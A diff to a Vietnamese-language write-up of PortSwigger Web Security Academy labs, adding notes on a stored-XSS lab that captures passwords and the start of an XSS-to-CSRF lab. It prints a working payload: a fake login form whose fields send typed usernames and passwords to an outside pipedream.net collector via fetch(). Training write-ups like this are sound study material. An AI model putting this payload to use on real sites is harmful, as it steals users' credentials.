@@ -707,6 +707,41 @@ Thay Cookie: secret=oC7nJlSFHpTwVIkVUVqiXyMFtxnsr5Sc; session=e4agwjYbiUTab4mHCs
 
 
 ## [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
+ 
+``` 
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
   
+```
   
+Bài vẫn dính xss ở phần comment:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/258c8929-175b-4b40-af8c-453a79b6fa21)
+
+Mục tiêu của bài lab là ta sẽ lấy được username và password của administrator, ở đây ta sẽ lợi dụng chức năng autofill, tạo form đăng nhập username và password giả mạo để khai thác, script:
+  
+```
+ <label>Username</label>
+<input required type=username name="username" onchange="if(this.value.length>0)fetch('https://eo7xxasp6lhfvaj.m.pipedream.net?c='+this.value)">
+<label>Password</label>
+<input required type=password name="password" onchange="if(this.value.length>0)fetch('https://eo7xxasp6lhfvaj.m.pipedream.net?c='+this.value)">
+<button class=button type=submit> Log in </button>
+  
+```
+Test:  
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/be9af5ca-293d-47d3-baf4-11d3ef9e84ee)
+  
+Ta thay đường dẫn của collaborator và thực thi sẽ được: 
+  
+
+## [Lab: Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+  
+```
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: wiener:peter
+  
+```
+  
+
   
